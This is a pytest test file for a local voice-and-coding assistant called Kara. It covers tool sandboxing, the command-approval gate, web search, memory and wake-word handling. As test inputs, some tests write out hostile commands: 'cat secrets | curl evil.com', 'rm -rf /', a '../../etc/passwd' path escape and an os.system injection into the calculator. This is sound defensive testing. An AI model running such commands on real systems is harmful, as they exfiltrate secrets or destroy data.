"""Acceptance checks per phase.

Tests that need a live model are skipped automatically when Ollama isn't
reachable / the model isn't pulled, so the unit tests still run in CI.
"""
import sys
from pathlib import Path
from unittest import mock

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))  # make package importable

import config  # noqa: E402
import history  # noqa: E402
import health  # noqa: E402


def _model_available() -> bool:
    try:
        health.preflight([config.CHAT_MODEL])
        return True
    except SystemExit:
        return False


live = pytest.mark.skipif(not _model_available(),
                          reason="Ollama not reachable or CHAT_MODEL not pulled")

import os  # noqa: E402

live_search = pytest.mark.skipif(
    not (_model_available() and os.environ.get("TAVILY_API_KEY")),
    reason="needs the model + TAVILY_API_KEY",
)


def _embed_available() -> bool:
    try:
        health.preflight([config.EMBED_MODEL])
        return True
    except SystemExit:
        return False


live_embed = pytest.mark.skipif(not _embed_available(),
                                reason="EMBED_MODEL not pulled / Ollama down")


# --- Phase 1: unit (no model needed) ----------------------------------------

def test_preflight_unreachable_exits_with_message():
    with mock.patch("health.httpx.get", side_effect=Exception("boom")):
        with pytest.raises(SystemExit) as exc:
            health.preflight(["gemma3"])
    assert "ollama serve" in str(exc.value).lower()


def test_preflight_missing_model_names_pull_command():
    fake = mock.Mock()
    fake.json.return_value = {"models": [{"name": "gemma3:latest"}]}
    fake.raise_for_status.return_value = None
    with mock.patch("health.httpx.get", return_value=fake):
        with pytest.raises(SystemExit) as exc:
            health.preflight(["llama3.1"])
    assert "ollama pull llama3.1" in str(exc.value)


def test_preflight_passes_when_model_present():
    fake = mock.Mock()
    fake.json.return_value = {"models": [{"name": "gemma3:latest"}]}
    fake.raise_for_status.return_value = None
    with mock.patch("health.httpx.get", return_value=fake):
        health.preflight(["gemma3"])  # should not raise


def test_history_trim_preserves_system_and_caps_length():
    msgs = [{"role": "system", "content": "sys"}]
    for i in range(config.HISTORY_MAX_MESSAGES + 10):
        msgs.append({"role": "user", "content": f"m{i}"})
    history.trim(msgs)
    assert len(msgs) <= config.HISTORY_MAX_MESSAGES
    assert msgs[0]["role"] == "system"
    # most recent message survives
    assert msgs[-1]["content"] == f"m{config.HISTORY_MAX_MESSAGES + 9}"


def test_history_trim_never_orphans_a_tool_message():
    """After trimming, the kept window must not start on a `tool` message or an
    `assistant` carrying tool_calls (that would break the OpenAI message contract)."""
    msgs = [{"role": "system", "content": "sys"}]
    # Build many tool-using turns so the trim boundary lands inside a tool group.
    for i in range(config.HISTORY_MAX_MESSAGES):
        msgs.append({"role": "user", "content": f"q{i}"})
        msgs.append({"role": "assistant", "content": None,
                     "tool_calls": [{"id": f"c{i}", "type": "function",
                                     "function": {"name": "calculate", "arguments": "{}"}}]})
        msgs.append({"role": "tool", "tool_call_id": f"c{i}", "content": "42"})
        msgs.append({"role": "assistant", "content": f"answer {i}"})
    history.trim(msgs)
    body = msgs[1:]  # after the system message
    assert body, "trim should keep some history"
    # first kept message is a clean turn boundary...
    assert body[0]["role"] == "user"
    # ...and every tool message has a preceding assistant with tool_calls.
    for j, m in enumerate(body):
        if m.get("role") == "tool":
            assert j > 0 and body[j - 1].get("tool_calls"), "orphaned tool message"


# --- Phase 1: live (needs the model) ----------------------------------------

@live
def test_multiturn_recall():
    """A fact stated two turns earlier is recalled — proves history round-trips."""
    from llm import chat

    messages = [
        {"role": "system", "content": "You are a concise assistant."},
        {"role": "user", "content": "My favorite color is teal. Remember it."},
    ]
    reply1 = chat(messages).choices[0].message.content
    messages.append({"role": "assistant", "content": reply1})
    messages.append({"role": "user", "content": "What is my favorite color? One word."})
    reply2 = chat(messages).choices[0].message.content
    assert "teal" in reply2.lower()


# --- Phase 2: tool scaffold (unit, no model needed) -------------------------

def test_registry_halves_are_synced():
    import tools
    schema_names = {t["function"]["name"] for t in tools.TOOLS}
    assert schema_names == set(tools.TOOL_FUNCTIONS)


def test_calculate_and_error_handling():
    from tools import calc_tool
    assert calc_tool.calculate("17 * 23") == "391"
    assert calc_tool.calculate("(2**10) / 4") == "256.0"
    with pytest.raises(Exception):
        calc_tool.calculate("__import__('os').system('echo hi')")  # not arithmetic


def test_coding_tools_roundtrip_and_sandbox(tmp_path):
    import config
    from tools import coding
    with mock.patch.object(config, "WORKSPACE_ROOT", str(tmp_path)), \
            mock.patch.object(config, "COMMAND_APPROVAL", "auto"):
        assert "wrote" in coding.write_file("sub/hello.txt", "hi there")
        assert coding.read_file("sub/hello.txt") == "hi there"
        assert "sub/" in coding.list_dir(".")
        assert "[exit 0]" in coding.run_command("echo ok")
        with pytest.raises(ValueError):
            coding.read_file("../../etc/passwd")  # escapes workspace


def test_sandbox_rejects_symlink_escape(tmp_path):
    """A symlink inside the workspace pointing outside it must not be followable."""
    import os
    import config
    from tools import coding
    (tmp_path / "real.txt").write_text("inside")
    outside = tmp_path.parent / "kara_outside_secret"
    outside.write_text("SECRET")
    os.symlink(outside, tmp_path / "link")  # link -> file outside the workspace
    try:
        with mock.patch.object(config, "WORKSPACE_ROOT", str(tmp_path)):
            assert coding.read_file("real.txt") == "inside"      # normal path OK
            with pytest.raises(ValueError):
                coding.read_file("link")                          # escape blocked
    finally:
        outside.unlink()


def test_run_command_denied_when_no_approver(tmp_path):
    """Fail-safe: in prompt mode with no approver, commands are NOT executed."""
    import approval
    import config
    from tools import coding
    approval.reset()
    sentinel = tmp_path / "SHOULD_NOT_EXIST"
    with mock.patch.object(config, "WORKSPACE_ROOT", str(tmp_path)), \
            mock.patch.object(config, "COMMAND_APPROVAL", "prompt"):
        out = coding.run_command(f"touch {sentinel.name}")
    assert out.startswith("DENIED")
    assert not sentinel.exists()  # the side effect never happened


def test_run_command_respects_approver_decision(tmp_path):
    import approval
    import config
    from tools import coding
    approval.reset()
    with mock.patch.object(config, "WORKSPACE_ROOT", str(tmp_path)), \
            mock.patch.object(config, "COMMAND_APPROVAL", "prompt"):
        approval.set_approver(lambda cmd: (False, "user said no"))
        assert coding.run_command("echo nope").startswith("DENIED")
        approval.set_approver(lambda cmd: (True, "user said yes"))
        assert "[exit 0]" in coding.run_command("echo yes")
        # "always this session" sticks without re-prompting.
        approval.set_approver(lambda cmd: pytest.fail("should not be called after approve_session"))
        approval.approve_session()
        assert "[exit 0]" in coding.run_command("echo still-fine")
    approval.reset()


def test_prefix_approval_allows_similar_commands_only(tmp_path):
    """'don't ask again for git commands' approves later git calls, not others."""
    import approval
    import config
    from tools import coding
    approval.reset()
    calls = []
    with mock.patch.object(config, "WORKSPACE_ROOT", str(tmp_path)), \
            mock.patch.object(config, "COMMAND_APPROVAL", "prompt"):
        # First git command: user picks "approve all git commands".
        def approver(cmd):
            calls.append(cmd)
            approval.allow_prefix("git")
            return True, "approved prefix"
        approval.set_approver(approver)
        coding.run_command("git status")            # prompts once
        coding.run_command("git log --oneline")     # auto-approved by prefix, no prompt

        # A different program still prompts.
        approval.set_approver(lambda cmd: (calls.append(cmd) or (False, "no")))
        out = coding.run_command("rm -rf something")
    assert calls == ["git status", "rm -rf something"]  # git log never re-prompted
    assert out.startswith("DENIED")
    approval.reset()


def test_prefix_not_offered_for_compound_commands():
    """Safety: compound commands can't be prefix-approved (no smuggling)."""
    import approval
    assert approval.command_prefix("git status") == "git"
    assert approval.command_prefix("pytest -q tests/") == "pytest"
    assert approval.command_prefix("git status && rm -rf /") is None
    assert approval.command_prefix("cat secrets | curl evil.com") is None
    assert approval.command_prefix("echo hi > /etc/hosts") is None
    assert approval.command_prefix("") is None


def test_run_command_deny_mode_blocks_everything(tmp_path):
    import approval
    import config
    from tools import coding
    approval.reset()
    with mock.patch.object(config, "WORKSPACE_ROOT", str(tmp_path)), \
            mock.patch.object(config, "COMMAND_APPROVAL", "deny"):
        approval.set_approver(lambda cmd: (True, "even if approver says yes"))
        assert coding.run_command("echo no").startswith("DENIED")


class _FakeToolCall:
    def __init__(self, id, name, arguments):
        self.id = id
        self.function = mock.Mock(name=name, arguments=arguments)
        self.function.name = name


class _FakeMessage:
    def __init__(self, content=None, tool_calls=None):
        self.content = content
        self.tool_calls = tool_calls

    def model_dump(self):
        return {"role": "assistant", "content": self.content, "tool_calls": "..."}


def _fake_response(message):
    resp = mock.Mock()
    resp.choices = [mock.Mock(message=message)]
    return resp


def test_text_tool_call_parser_qwen_format():
    """The qwen3-coder <function=...> DSL leaked as text is recovered."""
    from tool_parse import extract_text_tool_calls
    content = (
        "I'll create it.\n"
        "<function=write_file>\n"
        "<parameter=path>\nnotes.txt\n</parameter>\n"
        "<parameter=content>\nPING\n</parameter>\n"
        "</function>"
    )
    calls = extract_text_tool_calls(content)
    assert calls == [{"name": "write_file", "args": {"path": "notes.txt", "content": "PING"}}]


def test_text_tool_call_parser_hermes_and_prose():
    from tool_parse import extract_text_tool_calls
    assert extract_text_tool_calls('<tool_call>{"name": "calculate", "arguments": {"expression": "2+2"}}</tool_call>') \
        == [{"name": "calculate", "args": {"expression": "2+2"}}]
    assert extract_text_tool_calls("just a normal sentence, no tools here") == []


def test_agent_turn_recovers_text_emitted_tool_call():
    """Acceptance: a model that emits its call as TEXT still drives the tool loop."""
    from agent import agent_turn
    leaked = (
        "<function=calculate>\n<parameter=expression>\n17 * 23\n</parameter>\n</function>"
    )
    responses = [
        _fake_response(_FakeMessage(content=leaked, tool_calls=None)),
        _fake_response(_FakeMessage(content="17 * 23 = 391.")),
    ]
    messages = [{"role": "user", "content": "what is 17*23"}]
    with mock.patch("agent.chat", side_effect=responses):
        final = agent_turn(messages)
    assert "391" in final
    # The synthesized assistant message must carry structured tool_calls (valid contract).
    asst = [m for m in messages if m.get("role") == "assistant" and m.get("tool_calls")]
    assert asst and asst[0]["tool_calls"][0]["function"]["name"] == "calculate"
    tool_msg = [m for m in messages if m.get("role") == "tool"][0]
    assert tool_msg["content"] == "391"


def test_agent_turn_recovers_from_raising_tool():
    """Acceptance: a tool that raises is reported gracefully and the model recovers."""
    from agent import agent_turn

    # Turn 1: model asks for a bad calc (raises). Turn 2: model answers from the error.
    responses = [
        _fake_response(_FakeMessage(tool_calls=[_FakeToolCall("c1", "calculate", '{"expression": "nonsense!!"}')])),
        _fake_response(_FakeMessage(content="I couldn't compute that — the expression was invalid.")),
    ]
    messages = [{"role": "user", "content": "compute nonsense"}]
    with mock.patch("agent.chat", side_effect=responses):
        final = agent_turn(messages)

    assert "invalid" in final.lower()
    tool_msgs = [m for m in messages if m.get("role") == "tool"]
    assert tool_msgs and tool_msgs[0]["content"].startswith("ERROR:")  # error fed back, no crash


# --- Phase 2: live (needs the model) ----------------------------------------

@live
def test_time_tool_is_triggered():
    """Acceptance: 'What time is it?' triggers the time tool and the answer reflects it."""
    import datetime
    from agent import agent_turn
    messages = [
        {"role": "system", "content": "You are a coding agent. Use tools when needed."},
        {"role": "user", "content": "What is the current time? Use your tool."},
    ]
    answer = agent_turn(messages)
    assert any(m.get("role") == "tool" for m in messages)  # a tool actually ran
    assert str(datetime.date.today().year) in answer  # answer reflects the tool result


# --- Phase 3: web search (unit, no network) ---------------------------------

def test_web_search_tavily_formats_citeable_blocks():
    import config
    from tools import search
    fake_client = mock.Mock()
    fake_client.search.return_value = {"results": [
        {"title": "Python 3.13", "url": "https://ex.com/a", "content": "released"},
        {"title": "Changelog", "url": "https://ex.com/b", "content": "details"},
    ]}
    with mock.patch.object(config, "SEARCH_PROVIDER", "tavily"), \
            mock.patch.object(config, "require_tavily_key", lambda: "fake-key"), \
            mock.patch("tavily.TavilyClient", return_value=fake_client):
        out = search.web_search("python release")
    assert "[1] Python 3.13\nhttps://ex.com/a\nreleased" in out
    assert "[2] Changelog" in out


def test_web_search_searxng_dispatch():
    import config
    from tools import search
    resp = mock.Mock()
    resp.json.return_value = {"results": [{"title": "T", "url": "http://u", "content": "c"}]}
    resp.raise_for_status.return_value = None
    with mock.patch.object(config, "SEARCH_PROVIDER", "searxng"), \
            mock.patch("httpx.get", return_value=resp) as getter:
        out = search.web_search("q", max_results=3)
    assert "[1] T\nhttp://u\nc" in out
    assert config.SEARXNG_URL in getter.call_args.args[0]  # hit the SearXNG endpoint


def test_web_search_network_failure_is_graceful():
    import config
    from tools import search
    with mock.patch.object(config, "SEARCH_PROVIDER", "searxng"), \
            mock.patch("httpx.get", side_effect=Exception("connection refused")):
        out = search.web_search("q")
    assert out.startswith("ERROR: couldn't reach the web")


def test_fetch_url_cleans_and_truncates():
    import config
    from tools import search
    html = "<html><head><style>.x{}</style></head><body><script>evil()</script>" \
           "<p>Hello</p><p>" + "A" * 5000 + "</p></body></html>"
    resp = mock.Mock(text=html)
    resp.raise_for_status.return_value = None
    with mock.patch("httpx.get", return_value=resp), \
            mock.patch.object(config, "MAX_FETCH_CHARS", 200):
        out = search.fetch_url("https://ex.com")
    assert "Hello" in out
    assert "evil()" not in out and ".x{}" not in out          # script/style stripped
    assert "truncated to 200 chars" in out and len(out) < 400  # capped


# --- Phase 3: live (needs model + TAVILY_API_KEY) ---------------------------

@live_search
def test_current_events_triggers_search_and_cites():
    from agent import agent_turn
    messages = [
        {"role": "system", "content": "You are Kara. Use web_search for current info and cite [1]."},
        {"role": "user", "content": "Search the web for the latest stable Python 3 release and cite your source."},
    ]
    answer = agent_turn(messages)
    names = [tc["function"]["name"]
             for m in messages if m.get("role") == "assistant" and m.get("tool_calls")
             for tc in m["tool_calls"]]
    assert "web_search" in names      # it actually searched
    # Cited *something* — a numbered marker or a source URL. (Exact citation format
    # varies run-to-run; assert the behavior, not a brittle literal string.)
    import re
    assert re.search(r"\[\d+\]", answer) or "http" in answer


# --- Phase 5: voice ---------------------------------------------------------

def test_clean_for_speech_strips_markup():
    import voice
    out = voice._clean_for_speech(
        "Here is the fix:\n```python\nprint('hi')\n```\nUse `reverse()` — see [1] https://x.com/a"
    )
    assert "print('hi')" not in out      # code never spoken
    assert "screen" in out.lower()       # points to the printed code instead
    assert "reverse()" in out            # inline code unwrapped
    assert "[1]" not in out              # citation marker dropped
    assert "https" not in out and "a link" in out
    # non-Latin scripts (which the English voice can't read) are stripped, Latin kept
    spoken = voice._clean_for_speech("Try the 帝皇北京烤鸭 (Imperial Peking duck) at Wing Lei")
    assert "帝" not in spoken and "烤鸭" not in spoken
    assert "Imperial Peking duck" in spoken and "Wing Lei" in spoken


def test_followup_reference_skips_memory():
    import main
    # references to the current conversation → memory recall is skipped
    assert main._is_followup_reference("what should I get going there")
    assert main._is_followup_reference("what's good at that place")
    assert main._is_followup_reference("can I order there as one person")
    # acting on prior-conversation content (export/pronoun) → skip recall so stored
    # personal memory can't be dumped in place of the actual list
    assert main._is_followup_reference("Can you put them in an excel sheet?")
    assert main._is_followup_reference("save those to a spreadsheet")
    assert main._is_followup_reference("list the results")
    assert main._is_followup_reference("export them as a csv")
    # genuine personal questions are NOT follow-up references (memory still recalled)
    assert not main._is_followup_reference("what should I get my girlfriend")
    assert not main._is_followup_reference("remember my birthday is August 5")
    assert not main._is_followup_reference("what do you remember about my girlfriend")
    assert not main._is_followup_reference("what do you know about Wontaek")


def test_relationship_memory_only_surfaces_when_relevant():
    import main
    flower = {"text": "Remind Wontaek to get his girlfriend Ixtlalli flowers ONLY when he asks what gift to get her."}
    desc = {"text": "Wontaek describes his girlfriend Ixtlalli as beautiful and kind."}
    other = {"text": "Kevin and the user like to go snowboarding together."}
    mems = [flower, desc, other]
    def kept(s):
        return [m["text"] for m in main._filter_relationship_mems(mems, s)]
    # off-topic turns drop the girlfriend memories entirely
    assert kept("I always miss metropolitan plant exchange") == [other["text"]]
    assert kept("what are the best flower stores in Fort Lee") == [other["text"]]
    # but a gift question, her being upset, or asking about her keeps them
    assert flower["text"] in kept("what should I get her for her birthday")
    assert flower["text"] in kept("she seems really sad today")
    assert desc["text"] in kept("what do you remember about my girlfriend")
    # conversation-recap requests also skip memory (summarize the chat, not background)
    assert main._is_conversation_recap("what have we been talking about?")
    assert main._is_conversation_recap("can you recap our conversation")
    assert main._is_conversation_recap("remind me what we discussed")
    assert not main._is_conversation_recap("what is my girlfriend's name")
    # requests/questions skip casual fact extraction (no fake saves from task content)
    assert main._is_request("are you able to write a letter that says I love him")
    assert main._is_request("can you create an excel file")
    assert main._is_request("what is my name?")
    assert not main._is_request("I prefer dark mode")
    assert not main._is_request("my name is Bob")


def test_deflection_detection_and_search_check():
    import main
    assert main._is_deflection("As my recent knowledge cutoff is 2025, I can't provide the most current information")
    assert main._is_deflection("I'd suggest checking their current website or recent reviews")
    assert main._is_deflection("My data may be outdated")
    # broadened: factual-knowledge gaps should also force a search
    assert main._is_deflection("I'm not familiar with that library")
    assert main._is_deflection("I've never heard of that framework")
    assert main._is_deflection("I don't have information about that company")
    assert main._is_deflection("I'm unable to find any information on it")
    # deflecting to the injected background instead of searching the web
    assert main._is_deflection("Based on the background information provided, there is no specific information about the World Cup")
    assert main._is_deflection("That isn't included in the provided background, so I would need to search for current information")
    assert main._is_deflection("The background notes don't contain this information")
    assert main._is_deflection("I cannot provide details about South Korea's World Cup performance")
    assert not main._is_deflection("Wing Lei serves Peking duck and dim sum.")
    assert not main._is_deflection("The background music in the film was composed by Hans Zimmer.")
    assert not main._is_deflection("South Korea beat Germany 2-0 in their last group match [1].")
    # detects a web_search tool call among this turn's messages
    msgs = [{"role": "user", "content": "q"},
            {"role": "assistant", "tool_calls": [{"function": {"name": "web_search"}}]},
            {"role": "tool", "content": "results"}]
    assert main._used_web_search(msgs, 0)
    assert not main._used_web_search([{"role": "assistant", "content": "hi"}], 0)


def test_voice_never_speaks_code_and_estimates_duration():
    import voice
    code_reply = "Here is the function:\n```python\ndef f():\n    return 42\n```\nThat's it."
    spoken = voice._clean_for_speech(code_reply)
    assert "def f()" not in spoken and "return 42" not in spoken   # code never spoken
    assert "screen" in spoken.lower()                              # points to printed code
    assert voice.estimate_seconds("Hi there, all good.") < 30      # short
    assert voice.estimate_seconds(" ".join(["word"] * 300)) > 30   # long -> would summarize


def test_wake_word_gating():
    """Voice mode only responds to utterances addressed to Kara; mispronunciations ok."""
    import voice
    # addressed → returns the command after the wake word
    assert voice.strip_wake_word("hey kara what time is it") == "what time is it"
    assert voice.strip_wake_word("hey cara, create a file") == "create a file"
    assert voice.strip_wake_word("Cora how are you") == "how are you"      # homophone, no 'hey'
    assert voice.strip_wake_word("hey kira open the door") == "open the door"
    assert voice.strip_wake_word("hey kara") == ""                          # addressed, no command
    # NOT addressed → ignored
    assert voice.strip_wake_word("create a file called test.py") is None
    assert voice.strip_wake_word("hey there how are you") is None


def _voice_ok() -> bool:
    import importlib.util
    import shutil
    return importlib.util.find_spec("faster_whisper") is not None and shutil.which("say") is not None


@pytest.mark.skipif(not _voice_ok(), reason="needs faster-whisper + macOS `say`")
def test_stt_roundtrip_say_to_whisper(tmp_path):
    """Generate speech with `say`, transcribe it back — proves the STT path."""
    import subprocess
    import voice
    wav = tmp_path / "u.wav"
    subprocess.run(["say", "-o", str(wav), "--data-format=LEF32@16000",
                    "reverse a string in python"], check=True)
    text = voice.transcribe(str(wav)).lower()
    assert "reverse" in text and "string" in text


# --- Phase 4: long-term memory ----------------------------------------------

def test_extract_facts_durable_vs_chitchat():
    from memory.extract import extract_facts
    assert extract_facts("My name is Wontaek") == ["The user's name is Wontaek"]
    assert extract_facts("I prefer dark mode and I love Python") == \
        ["The user prefers dark mode", "The user loves Python"]
    assert extract_facts("I live in Seattle") == ["The user lives in Seattle"]
    assert extract_facts("My favorite editor is neovim") == ["The user's favorite editor is neovim"]
    # " and " inside a value must not split/corrupt the fact
    assert extract_facts("My favorite seasoning is salt and pepper") == \
        ["The user's favorite seasoning is salt and pepper"]
    assert "allergic to shellfish" in extract_facts("remember that I am allergic to shellfish")[0]
    # chitchat / coding requests → nothing stored
    assert extract_facts("can you refactor this function?") == []
    assert extract_facts("what's the weather today?") == []


def test_extract_explicit_remember_requests():
    """Various ways of explicitly asking Kara to remember all commit a fact."""
    from memory.extract import extract_facts
    assert extract_facts("remember that I have a standup every Monday at 9am") == \
        ["The user has a standup every Monday at 9am"]
    assert extract_facts("make a note that the deadline is Friday") == ["The deadline is Friday"]
    assert extract_facts("don't forget I'm allergic to peanuts") == ["The user is allergic to peanuts"]
    assert extract_facts("save this to memory: the staging server is db-02") == \
        ["The staging server is db-02"]
    assert extract_facts("note that my manager is Alex") == ["The user's manager is Alex"]
    # a request phrased as a question still saves (the trailing "?" must not reject it)
    assert extract_facts("Can you remember that my birthday is on July 1st, 1984?") == \
        ["The user's birthday is on July 1st, 1984"]
    # not a memory request → nothing
    assert extract_facts("what should I make for dinner") == []
    # garbage / fragments / meta-commands → nothing
    assert extract_facts("That?") == []
    assert extract_facts("make a note of it. make it to memory") == []


def test_memory_scope_detection():
    import main
    assert main._memory_scope("remember this forever") == "global"
    assert main._memory_scope("remember to test everywhere") == "global"
    assert main._memory_scope("remember this for this project") == "local"
    assert main._memory_scope("remember locally that the port is 8080") == "local"
    assert main._memory_scope("remember my name is Wontaek") is None       # ambiguous → ask
    # answers to the "forever or this project?" question
    assert main._scope_answer("forever") == "global"
    assert main._scope_answer("just for this project") == "local"
    assert main._scope_answer("everywhere please") == "global"
    assert main._scope_answer("what's the weather") is None
    # trailing scope qualifier trimmed from the stored fact
    assert main._strip_scope_tail("This project uses pytest, just for this project") == \
        "This project uses pytest"
    assert main._strip_scope_tail("The user's key is abc forever") == "The user's key is abc"


@live_embed
def test_store_scopes_save_and_recall_both():
    from memory import store
    g, gt, lc, lt = (_temp_collection() for _ in range(4))
    with mock.patch.object(store, "_col", g), mock.patch.object(store, "_trash", gt), \
            mock.patch.object(store, "_local", (lc, lt)):
        assert store.save_memory("The user's lucky number is 7", scope="global") == "saved"
        assert store.save_memory("This project uses pytest", scope="local") == "saved"
        assert store.recall("lucky number")[0]["text"].endswith("7")          # global hit
        assert any("pytest" in h["text"]                                       # local hit
                   for h in store.recall("what does this project use for testing"))
        assert store.count() == 2  # 1 global + 1 local across scopes


def test_remembered_content_captures_full_request():
    """Deterministic capture keeps every detail, regardless of cue position."""
    from memory.extract import remembered_content
    # cue at the end, multiple facts in one sentence — all kept
    assert remembered_content(
        "my girlfriend's name is Ana, born May 1 2000. can you remember that?") == \
        ["The user's girlfriend's name is Ana, born May 1 2000"]
    # cue at the start
    assert remembered_content("remember that my anniversary is August 15th") == \
        ["The user's anniversary is August 15th"]
    # reminders get framed
    assert remembered_content("remind me to call the dentist")[0].startswith("Remind Wontaek to")
    # no real content → nothing
    assert remembered_content("can you remember that?") == []


def test_memory_router_helpers():
    import main
    # questions vs commands
    assert main._is_memory_question("do you remember my dog's name?")
    assert not main._is_memory_question("remember that my dog is Rex")
    # retractions (soft) vs permanent deletes
    assert main._is_forget("actually that was a joke")
    assert main._is_forget("forget that")
    assert main._is_forget("never mind")
    assert main._is_forget("that's not real")
    assert not main._is_forget("tell me about my dog")
    assert main._is_permanent_delete("permanently delete my dog")
    assert main._is_permanent_delete("delete that forever")
    assert main._is_forget("permanently delete my dog")        # permanent counts as a delete
    assert not main._is_permanent_delete("forget that")        # soft, not permanent
    # confirmations — short/clear only, so ordinary sentences don't confirm a stale offer
    assert main._is_affirm("yes")
    assert main._is_affirm("yes please")
    assert main._is_affirm("yes please remember that")
    assert not main._is_affirm("no")
    assert not main._is_affirm("sure, go ahead and refactor the parser")  # not a confirmation
    assert not main._is_affirm("do it after you read the file first")
    # bare retraction (drop last save) vs targeted delete
    assert main._is_bare_retract("that was a joke")
    assert main._is_bare_retract("actually that was a joke")     # leading filler ok
    assert main._is_bare_retract("oh wait, never mind")
    assert main._is_bare_retract("forget that")
    assert not main._is_bare_retract("forget that I have a dog")  # has a target
    # coding delete must NOT be treated as a memory forget
    assert not main._is_forget("delete that function")
    assert not main._is_forget("remove that import")
    assert main._is_forget("forget my SoFi job")


@live_embed
def test_store_soft_delete_restore_and_permanent():
    from memory import store
    col, trash = _temp_collection(), _temp_collection()
    with mock.patch.object(store, "_col", col), mock.patch.object(store, "_trash", trash):
        store.save_memory("The user's dog's name is Rex")
        store.save_memory("The user prefers Kotlin")

        # soft delete → leaves active, lands in the stockpile, restorable
        deleted = store.soft_delete("forget about my dog")
        assert deleted and "Rex" in deleted
        assert col.count() == 1 and trash.count() == 1
        assert not any("Rex" in h["text"] for h in store.recall("my dog"))  # gone from active
        assert store.recall_deleted("dog")[0]["text"] == deleted
        assert store.restore(deleted) == deleted
        assert col.count() == 2 and trash.count() == 0        # back in active

        # permanent delete → gone for good (not in stockpile)
        gone = store.hard_delete("the dog")
        assert gone and "Rex" in gone
        assert col.count() == 1 and trash.count() == 0
        assert "Kotlin" in store.recall("language")[0]["text"]  # unrelated kept


@live_embed
def test_trash_auto_purge_after_ttl():
    import time
    from memory import store
    col, trash = _temp_collection(), _temp_collection()
    with mock.patch.object(store, "_col", col), mock.patch.object(store, "_trash", trash):
        store.save_memory("The user's dog is Rex")
        store.soft_delete("dog")
        assert trash.count() == 1
        assert store.purge_old_deleted(max_age_days=365) == 0      # too recent to purge
        g = trash.get()                                            # age it past the TTL
        trash.update(ids=g["ids"], metadatas=[{"deleted_ts": time.time() - 400 * 86400}])
        assert store.purge_old_deleted(max_age_days=365) == 1
        assert trash.count() == 0


def test_remember_cue_and_nonfact_rejection():
    from memory.extract import has_remember_cue, _is_meaningful
    # cues that should trigger the reliable LLM extraction pass
    assert has_remember_cue("can you remember that her name is Ana")
    assert has_remember_cue("remind me to call her")
    assert has_remember_cue("don't forget my anniversary")
    assert not has_remember_cue("what's the weather in Reno")
    # non-facts (assertions of not-knowing) are rejected even if well-formed
    assert not _is_meaningful("The user's name is not known")
    assert not _is_meaningful("I don't have that information")
    assert _is_meaningful("Wontaek's girlfriend was born on December 30, 2000")


def _temp_collection():
    import uuid

    import chromadb
    # unique name per call so tests don't share/pollute one collection
    return chromadb.Client().get_or_create_collection(
        f"test_mem_{uuid.uuid4().hex}", metadata={"hnsw:space": "cosine"})


@live_embed
def test_memory_save_recall_threshold_and_dedup():
    from memory import store
    col = _temp_collection()
    with mock.patch.object(store, "_col", col):
        assert store.save_memory("The user's name is Wontaek") == "saved"
        assert store.save_memory("The user prefers dark mode") == "saved"

        # Related query recalls the right fact...
        hits = store.recall("what is my name")
        assert hits and "Wontaek" in hits[0]["text"]
        # ...an unrelated query injects nothing (distance threshold works).
        assert store.recall("how do I reverse a linked list") == []
        # ...the same fact twice does not create a second entry.
        assert store.save_memory("The user's name is Wontaek") == "duplicate"
        assert col.count() == 2


@live
def test_known_question_skips_search():
    """Acceptance: a question the model knows does NOT trigger a web search."""
    from agent import agent_turn
    messages = [
        {"role": "system", "content": "You are Kara."},
        {"role": "user", "content": "What is the capital of France? Answer directly from your knowledge."},
    ]
    answer = agent_turn(messages)
    names = [tc["function"]["name"]
             for m in messages if m.get("role") == "assistant" and m.get("tool_calls")
             for tc in m["tool_calls"]]
    assert "web_search" not in names
    assert "paris" in answer.lower()


@live
def test_agent_writes_and_runs_code(tmp_path):
    """A coding task: the agent writes a file and runs it in the workspace."""
    import config
    from agent import agent_turn
    with mock.patch.object(config, "WORKSPACE_ROOT", str(tmp_path)), \
            mock.patch.object(config, "COMMAND_APPROVAL", "auto"):
        messages = [
            {"role": "system", "content": "You are a coding agent. Use your file and shell tools."},
            {"role": "user", "content": "Create hello.py that prints exactly HELLO_AGENT, then run it and tell me the output."},
        ]
        answer = agent_turn(messages)
    assert (tmp_path / "hello.py").exists()
    assert "HELLO_AGENT" in answer


def test_skill_loading_and_matching():
    import skills
    loaded = skills.load_skills()
    names = {s["name"] for s in loaded}
    # the vetted skills ship and parse (frontmatter + body)
    assert {"arxiv-summarizer", "code-review", "deep-research",
            "data-to-spreadsheet", "git-commit"} <= names
    for s in loaded:
        assert s["body"] and s["triggers"]  # every skill has instructions + triggers

    def matched(text):
        return [s["name"] for s in skills.match_skills(text)]
    # triggers route the right playbook in
    assert "arxiv-summarizer" in matched("summarize recent papers on transformers")
    assert "code-review" in matched("can you review this code for bugs")
    assert "deep-research" in matched("do some research on vector databases")
    assert "data-to-spreadsheet" in matched("put them in an excel spreadsheet")
    assert "git-commit" in matched("commit these changes")
    # unrelated turns pull in nothing
    assert matched("how is the weather today") == []
    # never exceed the per-turn cap
    assert len(skills.match_skills("research and review this code then commit it")) \
        <= config.MAX_SKILLS_PER_TURN


def test_skill_preface_and_frontmatter_parsing(tmp_path):
    import skills
    (tmp_path / "demo.md").write_text(
        "---\nname: demo\ndescription: A demo skill.\ntriggers: foobar, \\bwidget(s)?\\b\n"
        "---\nDo the foobar thing in three steps.\n")
    (tmp_path / "_hidden.md").write_text("---\nname: hidden\ntriggers: foobar\n---\nignored\n")
    (tmp_path / "nofront.md").write_text("just text, no frontmatter\n")
    loaded = skills.load_skills(str(tmp_path))
    assert [s["name"] for s in loaded] == ["demo"]  # _hidden skipped, nofront rejected
    m = skills.match_skills("please foobar this", skills=loaded)
    assert [s["name"] for s in m] == ["demo"]
    assert skills.match_skills("widget", skills=loaded)        # regex trigger compiles
    assert skills.match_skills("nothing here", skills=loaded) == []
    pre = skills.skills_preface(m)
    assert "Skill: demo" in pre and "three steps" in pre
    assert skills.skills_preface([]) == ""


def test_confirm_action_gate():
    import approval
    approval.reset()
    # no confirmer registered (non-interactive) → fail safe to denied
    assert approval.confirm_action("do the thing?") is False
    # a registered confirmer decides (confirmer takes prompt + allow_always)
    approval.set_confirmer(lambda prompt, allow_always=True: True)
    assert approval.confirm_action("do the thing?") is True
    approval.set_confirmer(lambda prompt, allow_always=True: False)
    assert approval.confirm_action("do the thing?") is False
    # "yes to all" latches on for the session
    approval.confirm_auto()
    assert approval.confirm_action("anything now?") is True
    approval.reset()
    assert approval.confirm_action("back to denied?") is False


def test_confirm_action_always_ask_cannot_be_suppressed():
    """Calendar writes use always_ask=True: never auto-approved, never latched off."""
    import approval
    approval.reset()
    seen = []  # records the allow_always flag passed to the confirmer
